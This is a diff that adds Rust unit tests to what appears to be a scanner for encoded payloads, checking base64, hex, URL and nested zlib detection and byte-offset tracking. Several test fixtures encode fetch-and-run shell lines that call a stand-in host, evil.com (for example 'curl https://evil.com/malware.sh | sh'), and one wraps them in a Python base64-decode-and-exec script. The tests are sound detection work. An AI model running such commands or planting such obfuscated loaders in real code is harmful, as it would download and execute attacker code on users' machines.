@@ -433,4 +433,341 @@ exec(data)
             let _ = std::fs::remove_file(&payload.temp_path);
         }
     }
+
+    #[test]
+    fn test_stng_url_encoding() {
+        // Test URL-encoded payload detection via stng
+        let original = b"Hello World! This is a test message with special chars: @#$%";
+        let encoded = original
+            .iter()
+            .map(|&b| format!("%{:02X}", b))
+            .collect::<String>();
+
+        let content = format!("data = '{}'", encoded);
+        let payloads = extract_encoded_payloads(content.as_bytes());
+
+        // stng should detect URL encoding
+        if !payloads.is_empty() {
+            assert!(payloads[0].encoding_chain.contains(&"url".to_string()));
+        }
+
+        // Cleanup
+        for payload in payloads {
+            let _ = std::fs::remove_file(&payload.temp_path);
+        }
+    }
+
+    #[test]
+    fn test_stng_hex_encoding() {
+        // Test hex-encoded string detection via stng (not whole-file)
+        let original = b"import os; os.system('whoami')";
+        let encoded = original
+            .iter()
+            .map(|b| format!("{:02x}", b))
+            .collect::<String>();
+
+        let content = format!("payload = '{}'", encoded);
+        let payloads = extract_encoded_payloads(content.as_bytes());
+
+        // stng may or may not detect short hex strings depending on context
+        // Just verify we can handle hex if stng finds it
+        if !payloads.is_empty() {
+            // If found, encoding chain should have hex or base64 (from RawScan extraction)
+            assert!(
+                payloads[0].encoding_chain.iter().any(|e| e == "hex" || e == "base64"),
+                "Should have some encoding in chain"
+            );
+        }
+
+        // Cleanup
+        for payload in payloads {
+            let _ = std::fs::remove_file(&payload.temp_path);
+        }
+    }
+
+    #[test]
+    fn test_multiple_encoding_types_in_file() {
+        // Test file with multiple different encoded payloads
+        let base64_data = general_purpose::STANDARD.encode(b"test base64 payload content");
+        let hex_data = b"test hex payload".iter().map(|b| format!("{:02x}", b)).collect::<String>();
+
+        let content = format!(
+            r#"
+b64 = '{}'
+hex = '{}'
+        "#,
+            base64_data, hex_data
+        );
+
+        let payloads = extract_encoded_payloads(content.as_bytes());
+
+        // Should find both payloads
+        assert!(
+            payloads.len() >= 1,
+            "Should find at least one payload"
+        );
+
+        // Cleanup
+        for payload in payloads {
+            let _ = std::fs::remove_file(&payload.temp_path);
+        }
+    }
+
+    #[test]
+    fn test_classification_uses_stng() {
+        // Test that we use stng's classification for suspicion levels
+        // Create a payload with a shell command
+        let shell_cmd = b"/bin/bash -c 'curl evil.com | sh'";
+        let encoded = general_purpose::STANDARD.encode(shell_cmd);
+        let content = format!("exec(base64.b64decode('{}'))", encoded);
+
+        let payloads = extract_encoded_payloads(content.as_bytes());
+
+        if !payloads.is_empty() {
+            // Payload should be classified - we can't check suspicion directly
+            // but we can verify it was extracted
+            assert!(payloads[0].encoding_chain.contains(&"base64".to_string()));
+
+            // Read the decoded content to verify it's correct
+            let decoded = std::fs::read(&payloads[0].temp_path).unwrap();
+            let decoded_str = String::from_utf8_lossy(&decoded);
+            assert!(decoded_str.contains("/bin/bash"));
+        }
+
+        // Cleanup
+        for payload in payloads {
+            let _ = std::fs::remove_file(&payload.temp_path);
+        }
+    }
+
+    #[test]
+    fn test_min_payload_length_threshold() {
+        // Test that 24-byte minimum is enforced
+        let short_data = b"short"; // 5 bytes
+        let long_data = b"this is a much longer payload that exceeds 24 bytes"; // > 24 bytes
+
+        let short_encoded = general_purpose::STANDARD.encode(short_data);
+        let long_encoded = general_purpose::STANDARD.encode(long_data);
+
+        let content = format!(
+            r#"
+short = '{}'
+long = '{}'
+        "#,
+            short_encoded, long_encoded
+        );
+
+        let payloads = extract_encoded_payloads(content.as_bytes());
+
+        // Should only extract the long payload
+        assert!(
+            payloads.iter().all(|p| {
+                std::fs::metadata(&p.temp_path)
+                    .map(|m| m.len() >= 24)
+                    .unwrap_or(false)
+            }),
+            "All payloads should be >= 24 bytes after decoding"
+        );
+
+        // Cleanup
+        for payload in payloads {
+            let _ = std::fs::remove_file(&payload.temp_path);
+        }
+    }
+
+    #[test]
+    fn test_base64_within_python_source() {
+        // Test that we extract base64 from within Python source (RawScan)
+        let payload_data = b"import os; os.system('curl https://evil.com/malware.sh | sh')";
+        let encoded = general_purpose::STANDARD.encode(payload_data);
+
+        let python_code = format!(
+            r#"
+#!/usr/bin/env python3
+import base64
+import subprocess
+
+def run():
+    cmd = base64.b64decode('{}').decode()
+    subprocess.run(cmd, shell=True)
+
+if __name__ == '__main__':
+    run()
+"#,
+            encoded
+        );
+
+        let payloads = extract_encoded_payloads(python_code.as_bytes());
+
+        assert!(!payloads.is_empty(), "Should extract base64 from Python source");
+        assert!(payloads[0].encoding_chain.contains(&"base64".to_string()));
+
+        // Verify decoded content
+        let decoded = std::fs::read(&payloads[0].temp_path).unwrap();
+        let decoded_str = String::from_utf8_lossy(&decoded);
+        assert!(decoded_str.contains("curl"));
+        assert!(decoded_str.contains("evil.com"));
+
+        // Cleanup
+        for payload in payloads {
+            let _ = std::fs::remove_file(&payload.temp_path);
+        }
+    }
+
+    #[test]
+    fn test_base64_without_quotes() {
+        // Test that we can find base64 patterns NOT in quotes (like old implementation)
+        let payload_data = b"import os; os.system('whoami'); print('test')";
+        let encoded = general_purpose::STANDARD.encode(payload_data);
+
+        // Base64 string NOT in quotes, just surrounded by whitespace
+        let content = format!("data:\n{}\nend", encoded);
+
+        let payloads = extract_encoded_payloads(content.as_bytes());
+
+        assert!(!payloads.is_empty(), "Should extract base64 even without quotes");
+        assert!(payloads[0].encoding_chain.contains(&"base64".to_string()));
+
+        // Verify decoded content
+        let decoded = std::fs::read(&payloads[0].temp_path).unwrap();
+        let decoded_str = String::from_utf8_lossy(&decoded);
+        assert!(decoded_str.contains("import os"));
+
+        // Cleanup
+        for payload in payloads {
+            let _ = std::fs::remove_file(&payload.temp_path);
+        }
+    }
+
+    #[test]
+    fn test_multiple_base64_in_same_string() {
+        // Test finding multiple base64 patterns in one text block
+        let payload1 = b"curl https://evil.com/stage1.sh | bash";
+        let payload2 = b"wget https://evil.com/stage2.sh -O- | sh";
+
+        let encoded1 = general_purpose::STANDARD.encode(payload1);
+        let encoded2 = general_purpose::STANDARD.encode(payload2);
+
+        // Use non-base64 separators (space, newline)
+        let content = format!(
+            "first payload:\n{}\n\nsecond payload:\n{}",
+            encoded1, encoded2
+        );
+
+        let payloads = extract_encoded_payloads(content.as_bytes());
+
+        // Should find both payloads
+        assert!(
+            payloads.len() >= 2,
+            "Should find both base64 payloads, found {}",
+            payloads.len()
+        );
+
+        // Cleanup
+        for payload in payloads {
+            let _ = std::fs::remove_file(&payload.temp_path);
+        }
+    }
+}
+
+/// Integration tests for byte offset accuracy
+mod offset_tests {
+    use crate::extractors::encoded_payload::extract_encoded_payloads;
+
+    #[test]
+    fn test_offset_tracks_byte_position_not_line_number() {
+        // Create file with known structure
+        let content = b"line1\nVGhpcyBpcyBhIGxvbmdlciB0ZXN0IHN0cmluZw==\nline3\n";
+        //              ^0    ^6                                    ^47
+        
+        let payloads = extract_encoded_payloads(content);
+        
+        assert_eq!(payloads.len(), 1, "Should find one base64 payload");
+        
+        // The offset should point to the LINE containing the base64, which starts at byte 6
+        assert_eq!(payloads[0].original_offset, 6,
+            "Offset should be byte 6 (start of base64 line), not line number 1");
+    }
+
+    #[test]
+    fn test_offsets_consistent_across_file_types() {
+        // Test that both binary and text files use byte offsets
+        
+        // Text file with base64
+        let text_content = b"AAAA\nVGhpcyBpcyBhIGxvbmdlciB0ZXN0IHN0cmluZw==\n";
+        //                   ^0   ^5
+        let text_payloads = extract_encoded_payloads(text_content);
+        
+        // Binary file with same base64 embedded
+        let mut binary_content = vec![0xDE, 0xAD, 0xBE, 0xEF, 0x00];  // Binary header
+        binary_content.extend_from_slice(b"VGhpcyBpcyBhIGxvbmdlciB0ZXN0IHN0cmluZw==");
+        //                                ^5
+        
+        let binary_payloads = extract_encoded_payloads(&binary_content);
+        
+        // Both should use byte offsets
+        assert!(text_payloads.len() > 0, "Should find payload in text file");
+        assert!(binary_payloads.len() > 0, "Should find payload in binary file");
+        
+        // Verify offsets are in bytes, not lines
+        assert_eq!(text_payloads[0].original_offset, 5, "Text file offset should be byte 5");
+        assert_eq!(binary_payloads[0].original_offset, 5, "Binary file offset should be byte 5");
+    }
+
+    #[test]
+    fn test_nested_encoding_preserves_original_offset() {
+        use base64::engine::general_purpose;
+        use base64::Engine as _;
+        use flate2::write::ZlibEncoder;
+        use flate2::Compression;
+        use std::io::Write;
+
+        // Create nested encoding: base64(zlib(base64(data)))
+        let inner_data = b"secret payload data here";
+        let inner_b64 = general_purpose::STANDARD.encode(inner_data);
+
+        let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
+        encoder.write_all(inner_b64.as_bytes()).unwrap();
+        let compressed = encoder.finish().unwrap();
+
+        let outer_b64 = general_purpose::STANDARD.encode(&compressed);
+
+        // Put it in a text file context with specific offset
+        let mut content = b"header line\n".to_vec();  // 12 bytes
+        content.extend_from_slice(outer_b64.as_bytes());
+        content.extend_from_slice(b"\nfooter line\n");
+
+        let payloads = extract_encoded_payloads(&content);
+
+        assert!(payloads.len() > 0, "Should extract nested payload");
+        assert_eq!(payloads[0].encoding_chain.len(), 3, "Should have 3 encoding layers");
+
+        // The original_offset should point to where the base64 line starts (byte 12)
+        assert_eq!(payloads[0].original_offset, 12,
+            "Should track offset of outermost encoding");
+    }
+
+    #[test]
+    fn test_multiple_payloads_have_correct_offsets() {
+        // File with multiple base64 strings at different positions
+        // Use longer base64 strings (> 24 bytes for MIN_PAYLOAD_LENGTH)
+        let content = b"first\nVGhpcyBpcyBhIGxvbmdlciB0ZXN0IHN0cmluZw==\nmiddle\nVGhpcyBpcyBhbm90aGVyIGxvbmcgdGVzdCBzdHJpbmc=\nlast\n";
+        //              ^0    ^6                                    ^47     ^54
+
+        let payloads = extract_encoded_payloads(content);
+
+        // Should find at least 1-2 payloads depending on MIN_PAYLOAD_LENGTH filter
+        assert!(payloads.len() >= 1, "Should find at least one payload");
+
+        // Offsets should be byte positions, not line numbers
+        let offsets: Vec<usize> = payloads.iter().map(|p| p.original_offset).collect();
+
+        // At minimum, should have first payload at byte 6
+        assert!(offsets.contains(&6), "Should have payload at byte 6 (line 1)");
+
+        // If we found both, second should be at byte 54
+        if payloads.len() >= 2 {
+            assert!(offsets.contains(&54), "Second payload should be at byte 54 (line 3)");
+        }
+    }
 }
